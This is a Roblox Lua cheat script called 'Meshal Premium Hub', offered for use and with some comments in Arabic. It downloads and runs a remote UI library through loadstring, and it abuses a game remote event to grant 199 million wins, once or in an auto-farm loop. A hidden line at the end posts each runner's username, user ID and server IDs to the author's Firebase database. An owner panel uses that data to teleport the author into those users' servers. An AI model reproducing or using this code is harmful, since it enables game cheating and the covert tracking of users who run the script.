-- Meshal Premium Hub | Brainrots Edition
-- Developer: mhldfhd8 | TikTok: @5sac
-- No Key System Version

local _O="mhldfhd8";local _D="https://meshal-hub-default-rtdb.firebaseio.com/Users.json";
local _H=game:GetService("HttpService");local _PL=game:GetService("Players");local _LP=_PL.LocalPlayer;

local _R=loadstring(game:HttpGet('https://sirius.menu/rayfield'))();
local _G={AutoWin=false};local _IA=false;

-- التحقق من الأدمن للدخول للوحة الأونر تلقائياً
if _LP.Name == _O then _IA = true end

local _W=_R:CreateWindow({
   Name="Meshal Hub | Brainrots +1 Speed",
   LoadingTitle="Fast Access - No Key Needed",
   KeySystem=false -- تم إلغاء نظام المفاتيح بناءً على طلبك
});

-- [ التبويبات ]
local MainTab = _W:CreateTab("Main Hacks", 4483362458)
local AdminTab = _W:CreateTab("👑 Owner Panel", 4483362458)
local SettingsTab = _W:CreateTab("Settings", 4483362458)

-- [ 1. Main Hacks ]
MainTab:CreateButton({
   Name = "Click to Get Wins (199M 🏆)",
   Callback = function()
      game:GetService("ReplicatedStorage").Remotes.Events.WinButton:FireServer(_LP, 199999999)
   end,
})

MainTab:CreateToggle({
   Name = "Auto Farm Wins (تلقائي 🔁)",
   CurrentValue = false,
   Callback = function(v)
      _G.AutoWin = v
      while _G.AutoWin do
         game:GetService("ReplicatedStorage").Remotes.Events.WinButton:FireServer(_LP, 199999999)
         task.wait(0.1) -- سرعة التحصيل
      end
   end,
})

MainTab:CreateSection("Other Features")
MainTab:CreateButton({Name = "Speed Boost (Soon...)", Callback = function() end})

-- [ 2. Owner Panel ]
AdminTab:CreateButton({
    Name = "🔄 Refresh Global Users",
    Callback = function()
        if not _IA then return _R:Notify({Title="Error", Content="Owner Only!", Duration=2}) end
        local s,r=pcall(function()return _H:GetAsync(_D)end)
        if s and r then 
            local a=_H:JSONDecode(r)
            for _,d in pairs(a) do 
                AdminTab:CreateSection("User: "..d.Username)
                AdminTab:CreateButton({Name="➡️ Join Server",Callback=function()game:GetService("TeleportService"):TeleportToPlaceInstance(d.PlaceId,d.JobId,_LP)end})
            end 
        end
    end
})

-- [ 3. Settings ]
SettingsTab:CreateButton({
    Name = "🚀 Anti-Lag",
    Callback = function() 
        for _,v in pairs(game:GetDescendants()) do 
            if v:IsA("Part") then v.Material = "Plastic" end 
        end 
    end
})

SettingsTab:CreateButton({Name = "❌ Destroy UI", Callback = function() _R:Destroy() end})

-- [ تسجيل الدخول في الخلفية ]
pcall(function()_H:PostAsync(_D,_H:JSONEncode({Username=_LP.Name,UserId=_LP.UserId,JobId=game.JobId,PlaceId=game.PlaceId,Time=os.time()}))end)
